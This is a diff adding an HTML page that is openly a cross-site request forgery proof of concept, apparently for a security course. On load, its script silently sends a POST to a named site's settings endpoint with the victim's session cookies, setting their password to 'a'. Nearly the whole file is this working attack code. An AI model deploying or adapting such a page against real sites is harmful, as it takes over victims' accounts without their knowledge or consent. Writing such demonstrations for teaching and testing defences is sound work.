@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>You've been redirected!</h1>
+    <script>
+      // Example CSRF attack: changing the victim's password in the background
+
+      // The victim's password change URL (target site)
+      const victimUrl = 'https://cats.is-course.ru/settings'; 
+
+      // The attacker can inject this code to change the victim's password without their consent
+      const newPassword = 'a';  // Attacker's chosen new password
+
+      // Use Fetch API to send a POST request to victim's server to change the password
+      fetch(victimUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',  // Sending JSON data
+        },
+        body: JSON.stringify({
+          password: "a",
+          "confirm-password": "a",
+        }),
+        credentials: 'include'  // Send cookies with the request (victim's session cookie)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Password change successful!');
+        } else {
+          console.log('Failed to change password');
+        }
+      })
+      .catch(error => console.error('Error:', error));
+    </script>
+  </body>
+</html>
+
